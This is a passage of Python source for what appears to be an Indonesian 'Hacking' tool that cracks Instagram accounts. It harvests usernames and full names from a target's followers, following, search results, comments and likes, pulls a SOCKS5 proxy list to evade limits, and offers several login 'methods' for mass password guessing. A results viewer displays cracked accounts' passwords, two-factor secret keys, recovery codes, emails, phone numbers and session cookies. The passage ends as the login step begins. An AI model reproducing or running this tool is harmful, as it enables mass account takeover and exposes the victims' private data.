from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
